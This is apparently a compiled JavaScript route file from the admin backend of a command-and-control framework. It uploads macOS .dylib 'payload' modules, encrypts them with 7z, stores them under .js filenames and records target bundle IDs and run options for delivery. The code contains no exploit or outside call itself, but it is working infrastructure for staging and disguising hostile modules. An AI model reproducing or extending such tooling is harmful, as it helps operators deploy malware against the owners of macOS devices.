import path from 'node:path';
import crypto from 'node:crypto';
import { mkdir, writeFile, unlink, readFile, stat } from 'node:fs/promises';
import { Payload } from '../../../core/db/models/index.js';
import { PayloadCrypto } from '../../../core/crypto/seven-zip.js';
import { invalidateConfigCache } from '../../c2/services/config-builder.js';
import { loadConfig } from '../../../config/index.js';
import { isSuperAdmin } from '../../../core/auth/permissions.js';
import { logger } from '../../../core/logger/index.js';
export async function payloadsRoute(fastify) {
    const adminOnly = async (request, reply) => {
        if (!isSuperAdmin(request.user?.role)) {
            reply.code(403);
            return reply.send({ error: 'Admin only' });
        }
    };
    fastify.get('/api/payloads/verify', { preHandler: adminOnly }, async () => {
        const config = loadConfig();
        const results = [];
        let allOk = true;
        const payloads = await Payload.find({}).sort({ name: 1 });
        for (const p of payloads) {
            const item = { name: p.name, status: 'ok' };
            const templatePath = path.join(process.cwd(), 'templates/payloads', `${p.name}.dylib`);
            try {
                const buf = await readFile(templatePath);
                const templateSha = crypto.createHash('sha256').update(buf).digest('hex');
                item.templateSha256 = templateSha;
                item.dbSha256 = p.sha256;
                if (templateSha !== p.sha256) {
                    item.status = 'sha_mismatch';
                    item.detail = 'template文件和DB记录的SHA不一致，需要重启更新';
                    allOk = false;
                }
            }
            catch (err) {
                if (err.code === 'ENOENT') {
                    item.templateSha256 = null;
                    item.dbSha256 = p.sha256;
                    item.detail = '模板文件不存在（可能是通过后台上传的）';
                }
                else {
                    item.status = 'error';
                    item.detail = `读取模板失败: ${err.message}`;
                    allOk = false;
                }
            }
            const encFullPath = path.join(config.storageRoot, p.encryptedPath);
            try {
                const s = await stat(encFullPath);
                item.encryptedFileSize = s.size;
            }
            catch {
                item.status = 'encrypted_missing';
                item.detail = '加密文件不存在';
                allOk = false;
            }
            results.push(item);
        }
        return { ok: allOk, count: results.length, data: results };
    });
    fastify.get('/api/payloads', { preHandler: adminOnly }, async () => {
        return { data: await Payload.find({}).sort({ type: 1, name: 1 }) };
    });
    fastify.post('/api/payloads/:name', { preHandler: adminOnly }, async (request, reply) => {
        const { name } = request.params;
        const config = loadConfig();
        // Read raw body as file upload
        const data = await request.file();
        if (!data) {
            reply.code(400);
            return { error: 'No file uploaded' };
        }
        const chunks = [];
        for await (const chunk of data.file) {
            chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);
        // Write to temp, encrypt with 7z
        const tmpDir = path.join(config.storageRoot, 'tmp');
        await mkdir(tmpDir, { recursive: true });
        const tmpPath = path.join(tmpDir, `${name}-${Date.now()}.dylib`);
        await writeFile(tmpPath, buffer);
        const encryptedDir = path.join(config.storageRoot, 'encrypted');
        await mkdir(encryptedDir, { recursive: true });
        const encryptedPath = path.join(encryptedDir, `${name}.js`);
        // 替换场景：先删旧加密文件，避免 7z 追加而非覆盖
        await unlink(encryptedPath).catch((err) => {
            if (err.code !== 'ENOENT')
                logger.warn({ err, encryptedPath }, 'Failed to remove old encrypted file');
        });
        await PayloadCrypto.encrypt(tmpPath, encryptedPath);
        await unlink(tmpPath).catch((err) => {
            logger.warn({ err, tmpPath }, 'Failed to remove temp file after encrypt');
        });
        // Update DB
        const sha256 = crypto.createHash('sha256').update(buffer).digest('hex');
        // 解析上传选项
        let options = {};
        if (data.fields?.options) {
            try {
                options = JSON.parse(data.fields.options.value || '{}');
            }
            catch (err) {
                logger.warn({ err, raw: data.fields.options.value }, 'Failed to parse payload upload options');
            }
        }
        const existing = await Payload.findOne({ name });
        if (existing) {
            // 替换：更新文件相关字段 + bundleId（如有传入）
            const updateFields = {
                sha256,
                size: buffer.length,
                encryptedPath: `encrypted/${name}.js`,
                updatedAt: new Date(),
            };
            if (options.bundleId !== undefined)
                updateFields.bundleId = options.bundleId;
            if (options.cold !== undefined)
                updateFields.cold = options.cold;
            if (options.doNotCloseAfterRun !== undefined)
                updateFields.doNotCloseAfterRun = options.doNotCloseAfterRun;
            await Payload.updateOne({ name }, { $set: updateFields });
            logger.info({ name, size: buffer.length, sha256, operator: request.user?.username }, 'Payload replaced');
        }
        else {
            // 新建：设置完整字段
            await Payload.create({
                name,
                originalName: `${name}.dylib`,
                sha256,
                size: buffer.length,
                encryptedPath: `encrypted/${name}.js`,
                type: 'module',
                bundleId: options.bundleId || '',
                cold: options.cold !== undefined ? options.cold : true,
                doNotCloseAfterRun: options.doNotCloseAfterRun !== undefined ? options.doNotCloseAfterRun : true,
                active: true,
            });
            logger.info({ name, size: buffer.length, sha256, operator: request.user?.username }, 'Payload created');
        }
        await invalidateConfigCache();
        return { success: true, sha256, size: buffer.length };
    });
}
//# sourceMappingURL=payloads.js.map